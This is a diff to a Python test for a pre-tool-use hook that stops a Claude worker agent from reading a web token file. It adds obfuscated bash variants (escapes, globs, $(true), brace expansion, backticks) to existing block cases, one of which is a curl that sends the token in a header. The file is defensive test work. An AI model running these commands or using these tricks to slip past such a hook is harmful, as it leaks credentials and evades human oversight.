@@ -5749,7 +5749,9 @@ def test_a_claude_worker_is_denied_reading_the_web_token(env, monkeypatch):
     assert "--settings" not in turn
     monkeypatch.setenv("TTP_RUN_DIR", str(run_dir))
     for cmd in (f"cat {token_path(p)}", "cat tt-project/state/web.token", "curl -H \"X: $(< state/web.token)\" x",
-                "python3 -c 'open(\"../state//web.token\").read()'"):
+                "python3 -c 'open(\"../state//web.token\").read()'",
+                "cat \\state/web.token", "cat *state/web.token", "cat $(true)state/web.token",
+                "cat {,}state/web.token", "cat `true`state/web.token"):
         out, _ = hook.pre_tool_use({"tool_name": "Bash", "tool_input": {"command": cmd}})
         assert "web token" in out["hookSpecificOutput"]["permissionDecisionReason"], cmd
     for cmd in ("grep -e. state/web.token", "grep --regexp=. state/web.token", "rg -e. state/web.token",
